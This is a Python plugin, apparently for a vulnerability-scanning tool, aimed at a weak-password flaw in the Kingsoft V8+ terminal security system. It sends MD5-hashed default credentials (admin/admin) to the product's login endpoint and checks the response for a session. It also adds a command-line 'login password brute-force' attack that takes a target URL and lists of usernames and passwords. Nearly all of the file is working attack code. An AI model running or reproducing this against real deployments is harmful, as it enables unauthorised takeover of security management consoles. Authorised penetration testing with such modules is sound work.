# -*-* coding:UTF-8
import hashlib


class Plugin(Base):
    __info__ = {
        "name": "金山V8+终端安全系统弱口令漏洞",
        "description": "",
        "references": ["-"],
    }
    username_list = ['admin']
    password_list = ['admin']

    def url(self) -> dict:
        res = self.custom_login_method(self.username_list, self.password_list, 1)
        if res:
            self.__info__.update({"username": res['username'], "password": res['password']})
            return {"LoopholeInfo": self.__info__}

    @login_method
    def custom_login_method(self, username, password):
        password = hashlib.md5(password.encode()).hexdigest()
        r = self.request(
            method='post',
            path='./inter/ajax.php?cmd=get_user_login_cmd',
            auth=(username, password),
            headers={"Content-type": "text/html; charset=utf-8"},
            timeout=15,
            data=f'{{"get_user_login_cmd":{{"name":"{username}","password":"{password}"}}}}'
        )
        if 'userSession' in r.text:
            return {"username": username, "password": password}

    @cli.command(description='登录口令爆破')
    @cli.options("url", help="攻击的目标", default="{self.target.value}")
    @cli.options("username", help="登录的账号", default=','.join(username_list))
    @cli.options("password", help="登录的密码", default=','.join(password_list))
    @cli.options("method", help="爆破的模式", choice=[1, 2], type=int, default=2)
    def login_attack(self, url, username, password, method):
        self.target.value = url
        res = self.custom_login_method(username.split(','), password.split(','), method)
        if res:
            self.log.success(f'username: {res["username"]}, password: {res["password"]}')
        else:
            self.log.failure('login failure')
